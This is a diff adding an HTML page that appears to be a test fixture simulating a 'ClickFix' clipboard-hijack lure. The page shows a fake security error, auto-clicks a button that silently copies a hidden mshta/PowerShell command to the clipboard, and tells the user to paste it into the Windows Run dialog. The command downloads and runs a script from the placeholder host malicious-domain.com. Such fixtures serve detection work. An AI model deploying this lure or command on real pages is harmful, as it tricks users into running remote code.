@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickFix Legacy - Test Fixture</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            text-align: center;
+            background: #f5f5f5;
+        }
+        .error-box {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .btn {
+            background: #dc3545;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+        #hiddenCommand {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+        }
+        .instructions {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 4px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="error-box">
+        <h2>⚠️ Critical Error Detected</h2>
+        <p>Your system requires an urgent security update</p>
+        <button id="fixBtn" class="btn">Fix Now</button>
+        <div id="instructions" class="instructions">
+            <strong>To apply the fix:</strong>
+            <ol style="text-align: left;">
+                <li>Press <kbd>Windows + R</kbd></li>
+                <li>Press <kbd>Ctrl + V</kbd> to paste the fix</li>
+                <li>Press <kbd>Enter</kbd> to execute</li>
+            </ol>
+        </div>
+    </div>
+
+    <!-- Hidden textarea containing malicious command -->
+    <textarea id="hiddenCommand" readonly>mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')"":Close")</textarea>
+
+    <script>
+        // Simulate legacy ClickFix attack using document.execCommand('copy')
+        document.getElementById('fixBtn').addEventListener('click', function() {
+            try {
+                // Select the hidden malicious command
+                const commandElement = document.getElementById('hiddenCommand');
+                commandElement.style.position = 'absolute';
+                commandElement.style.left = '0';
+                commandElement.select();
+                commandElement.setSelectionRange(0, 99999); // For mobile devices
+
+                // Copy to clipboard using legacy API (LEGACY CLICKFIX VECTOR)
+                const success = document.execCommand('copy');
+
+                // Hide the textarea again
+                commandElement.style.left = '-9999px';
+                window.getSelection().removeAllRanges();
+
+                if (success) {
+                    // Show instructions
+                    document.getElementById('instructions').style.display = 'block';
+                    this.textContent = '✓ Fix Copied';
+                    this.disabled = true;
+                    console.log('[ClickFix Legacy] Malicious payload copied via execCommand');
+                } else {
+                    alert('Copy failed. Please try again.');
+                }
+            } catch (err) {
+                console.error('[ClickFix Legacy] Failed to copy:', err);
+                alert('Fix failed to apply.');
+            }
+        });
+
+        // Auto-trigger after page load
+        setTimeout(function() {
+            document.getElementById('fixBtn').click();
+        }, 500);
+    </script>
+</body>
+</html>
